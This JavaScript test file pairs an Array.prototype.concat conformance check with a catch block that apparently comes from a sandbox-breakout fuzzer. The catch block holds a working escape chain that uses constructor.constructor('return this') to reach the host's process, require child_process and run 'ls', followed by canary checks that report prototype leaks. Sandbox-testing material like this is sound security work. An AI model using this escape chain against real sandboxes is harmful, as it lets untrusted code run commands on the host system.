try {
    var obj = {
        'length': '6',
        '1': 'A',
        '3': 'B',
        '5': 'C'
    };
    obj[Symbol.isConcatSpreadable] = true;
    var obj2 = {
        length: 3,
        '0': '0',
        '1': '1',
        '2': '2'
    };
    var arr = [
        'X',
        'Y',
        'Z'
    ];
    var expected = [
        void 0,
        'A',
        void 0,
        'B',
        void 0,
        'C',
        obj2,
        'X',
        'Y',
        'Z'
    ];
    var actual = Array.prototype.concat.call(obj, obj2, arr);
    assert(compareArray(actual, expected));
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}